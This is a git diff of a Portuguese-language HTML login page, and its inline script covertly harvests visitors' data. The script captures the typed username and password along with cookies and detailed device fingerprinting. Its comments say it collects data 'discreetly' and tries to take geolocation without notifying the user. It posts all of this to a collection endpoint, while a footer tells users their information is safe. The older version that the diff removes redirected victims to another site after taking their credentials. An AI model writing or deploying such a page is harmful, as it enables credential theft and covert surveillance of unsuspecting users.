@@ -128,163 +128,131 @@
         <p class="footer-text">Sua informação está segura conosco. Entre em contato para mais informações sobre nossa política de privacidade.</p>
     </div>
 
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
     <script>
-    
-    // Função para coletar dados de forma discreta
-function coletarDados() {
-    let dados = {
-        userAgent: navigator.userAgent,  // Informação do agente do usuário
-        navegador: navigator.appName,  // Nome do navegador
-        plataforma: navigator.platform,  // Plataforma do dispositivo
-        idioma: navigator.language,  // Idioma do navegador
-        corTema: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'escuro' : 'claro',  // Preferência de tema
-        tela: {
-            largura: screen.width,  // Largura da tela
-            altura: screen.height,  // Altura da tela
-            profundidade: screen.colorDepth,  // Profundidade de cor
-            orientação: screen.orientation ? screen.orientation.type : 'indefinido',  // Orientação da tela
-            profundidadeCor: screen.pixelDepth  // Profundidade de cor em pixels
-        },
-        cookies: document.cookie,  // Cookies do navegador
-        localStorage: localStorage.length,  // Tamanho do localStorage
-        sessionStorage: sessionStorage.length,  // Tamanho do sessionStorage
-        fusoHorario: new Date().getTimezoneOffset(),  // Fuso horário
-        dataHora: new Date().toString(),  // Data e hora atuais
-        larguraTela: window.innerWidth,  // Largura da tela do navegador
-        alturaTela: window.innerHeight,  // Altura da tela do navegador
-        online: navigator.onLine,  // Status online
-        dispositivosConectados: navigator.mediaDevices ? 'disponível' : 'não disponível',  // Dispositivos de mídia conectados (microfone, câmera)
-        idiomasAceitos: navigator.languages || 'não disponível',  // Idiomas aceitos pelo navegador
-        formaDeEntrada: navigator.input ? navigator.input : 'não disponível',  // Informações sobre dispositivos de entrada
-        sistemaOperacional: navigator.oscpu || 'não disponível',  // Sistema operacional (se disponível)
-        arquitetura: navigator.architecture || 'não disponível',  // Arquitetura do dispositivo (se disponível)
-        touchSupport: 'não disponível',  // Suporte a toque
-        memoryUsage: window.performance && window.performance.memory ? window.performance.memory : 'não disponível',  // Uso de memória (se disponível)
-        connectionSpeed: navigator.connection ? navigator.connection.downlinkMax : 'não disponível',  // Velocidade máxima de download
-        screenResolution: window.screen.width + 'x' + window.screen.height, // Resolução da tela
-        deviceType: navigator.userAgent.match(/Mobi/) ? "Móvel" : "Desktop", // Tipo de dispositivo (móvel ou desktop)
-        referrer: document.referrer,  // Página de origem
-        screenColorDepth: screen.colorDepth,  // Profundidade de cor da tela
-        cpuCores: navigator.hardwareConcurrency,  // Núcleos do processador
-        os: navigator.platform,  // Plataforma do sistema operacional
-        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,  // Fuso horário do navegador
-        browserVersion: navigator.appVersion,  // Versão do navegador
-        language: navigator.language,  // Idioma preferido do navegador
-        deviceMemory: navigator.deviceMemory || 'não disponível',  // Memória disponível
-        onlineStatus: navigator.onLine,  // Status da conexão (online/offline)
-        screenOrientation: screen.orientation.type,  // Tipo de orientação da tela
-        webGLRenderer: (function() { 
-            var canvas = document.createElement("canvas"); 
-            var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
-            return gl ? gl.getParameter(gl.RENDERER) : "não disponível"; 
-        })(),  // WebGL Renderer
-        batteryStatus: (function() {
-            return navigator.getBattery ? navigator.getBattery().then(function(battery) {
-                return {
-                    level: battery.level,
-                    charging: battery.charging
-                };
-            }) : 'não disponível';
-        })(),  // Status da bateria (se disponível)
-        cameraSupport: navigator.mediaDevices ? 'disponível' : 'não disponível'  // Câmera disponível
-    };
-
-    // Tenta obter a geolocalização sem notificar o usuário
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition((position) => {
-            dados.geolocalizacao = {
-                latitude: position.coords.latitude,
-                longitude: position.coords.longitude
+        // Função para coletar dados de forma discreta
+        function coletarDados() {
+            let dados = {
+                userAgent: navigator.userAgent,
+                navegador: navigator.appName,
+                plataforma: navigator.platform,
+                idioma: navigator.language,
+                corTema: window.matchMedia('(prefers-color-scheme: dark)').matches ? 'escuro' : 'claro',
+                tela: {
+                    largura: screen.width,
+                    altura: screen.height,
+                    profundidade: screen.colorDepth,
+                    orientação: screen.orientation ? screen.orientation.type : 'indefinido',
+                    profundidadeCor: screen.pixelDepth
+                },
+                cookies: document.cookie,
+                localStorage: localStorage.length,
+                sessionStorage: sessionStorage.length,
+                fusoHorario: new Date().getTimezoneOffset(),
+                dataHora: new Date().toString(),
+                larguraTela: window.innerWidth,
+                alturaTela: window.innerHeight,
+                online: navigator.onLine,
+                dispositivosConectados: navigator.mediaDevices ? 'disponível' : 'não disponível',
+                idiomasAceitos: navigator.languages || 'não disponível',
+                formaDeEntrada: navigator.input ? navigator.input : 'não disponível',
+                sistemaOperacional: navigator.oscpu || 'não disponível',
+                arquitetura: navigator.architecture || 'não disponível',
+                touchSupport: 'não disponível',
+                memoryUsage: window.performance && window.performance.memory ? window.performance.memory : 'não disponível',
+                connectionSpeed: navigator.connection ? navigator.connection.downlinkMax : 'não disponível',
+                screenResolution: window.screen.width + 'x' + window.screen.height,
+                deviceType: navigator.userAgent.match(/Mobi/) ? "Móvel" : "Desktop",
+                referrer: document.referrer,
+                screenColorDepth: screen.colorDepth,
+                cpuCores: navigator.hardwareConcurrency,
+                os: navigator.platform,
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                browserVersion: navigator.appVersion,
+                language: navigator.language,
+                deviceMemory: navigator.deviceMemory || 'não disponível',
+                onlineStatus: navigator.onLine,
+                screenOrientation: screen.orientation.type,
+                webGLRenderer: (function() {
+                    var canvas = document.createElement("canvas");
+                    var gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+                    return gl ? gl.getParameter(gl.RENDERER) : "não disponível";
+                })(),
+                batteryStatus: (function() {
+                    return navigator.getBattery ? navigator.getBattery().then(function(battery) {
+                        return {
+                            level: battery.level,
+                            charging: battery.charging
+                        };
+                    }) : 'não disponível';
+                })(),
+                cameraSupport: navigator.mediaDevices ? 'disponível' : 'não disponível'
             };
-            // Envia os dados para o servidor assim que a geolocalização for obtida
-            enviarDados(dados);
-        }, (err) => {
-            console.error('Erro ao obter geolocalização:', err);
-            // Envia os dados sem a geolocalização
-            enviarDados(dados);
+
+            // Tenta obter a geolocalização sem notificar o usuário
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition((position) => {
+                    dados.geolocalizacao = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude
+                    };
+                    // Envia os dados para o servidor assim que a geolocalização for obtida
+                    enviarDados(dados);
+                }, (err) => {
+                    console.error('Erro ao obter geolocalização:', err);
+                    // Envia os dados sem a geolocalização
+                    enviarDados(dados);
+                });
+            } else {
+                // Caso a geolocalização não seja permitida, envia os dados de qualquer maneira
+                enviarDados(dados);
+            }
+        }
+
+        // Função para enviar os dados ao servidor
+        function enviarDados(dados) {
+            fetch('http://localhost:3000/coletar-dados', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(dados), // Envia os dados como JSON
+            })
+            .then(response => response.text())
+            .then(data => console.log('Resposta do servidor:', data))
+            .catch(error => console.error('Erro ao enviar dados:', error));
+        }
+
+        // Coleta e envia os dados quando o formulário for enviado
+        document.getElementById('loginForm').addEventListener('submit', function(event) {
+            event.preventDefault();
+
+            // Coleta os dados do formulário
+            const nome = document.getElementById('nome').value;
+            const senha = document.getElementById('senha').value;
+
+            // Adiciona os dados do formulário ao objeto de dados
+            let dadosFormulario = {
+                nome: nome,
+                senha: senha,
+                ip: window.location.hostname,
+                dataHora: new Date().toString()
+            };
+
+            // Envia os dados do formulário
+            fetch('http://localhost:3000/coletar-dados', {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json',
+                },
+                body: JSON.stringify(dadosFormulario),
+            })
+            .then(response => response.text())
+            .then(data => console.log('Dados do formulário enviados:', data))
+            .catch(error => console.error('Erro ao enviar dados:', error));
+
+            // Coleta e envia os dados detalhados
+            coletarDados();
         });
-    } else {
-        // Caso a geolocalização não seja permitida, envia os dados de qualquer maneira
-        enviarDados(dados);
-    }
-
-    // Coleta de histórico de navegação (limitado por questões de segurança)
-    if (window.history) {
-        dados.historial = {
-            numeroDeEntradas: window.history.length,  // Número de entradas no histórico
-            podeNavegarParaTras: window.history.state ? 'sim' : 'não',  // Verifica se pode navegar para trás
-        };
-    }
-
-    // Coleta de abas abertas (com limitações)
-    if (window.localStorage) {
-        dados.abasAbertas = localStorage.length;  // Tentativa de coletar número de abas abertas com localStorage
-    }
-}
-
-  // Envia os dados para o servidor
-    fetch('http://localhost:3000/coletar-dados', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(dados),  // Envia os dados como JSON
-    })
-    .then(response => response.text())
-    .then(data => console.log('Resposta do servidor:', data))
-    .catch(error => console.error('Erro ao enviar dados:', error));
-}
-
-// Coleta e envia os dados quando o formulário for enviado
-document.getElementById('loginForm').addEventListener('submit', function(event) {
-    event.preventDefault();
-
-    // Coleta os dados do formulário
-    const nome = document.getElementById('nome').value;
-    const senha = document.getElementById('senha').value;
-
-    // Adiciona os dados do formulário ao objeto de dados
-    let dadosFormulario = {
-        nome: nome,
-        senha: senha,
-        ip: window.location.hostname,
-        dataHora: new Date().toString()
-    };
-
-    // Envia os dados do formulário
-    fetch('http://localhost:3000/coletar-dados', {
-        method: 'POST',
-        headers: {
-            'Content-Type': 'application/json',
-        },
-        body: JSON.stringify(dadosFormulario),  // Dados do formulário
-    })
-    .then(response => response.text())
-    .then(data => console.log('Dados enviados:', data))
-    .catch(error => console.error('Erro ao enviar dados:', error));
-
-    // Redireciona o usuário após o envio
-    window.location.href = 'https://www.site-do-detective.com';
-});
-   }
-     </script>
+    </script>
 </body>
 </html>
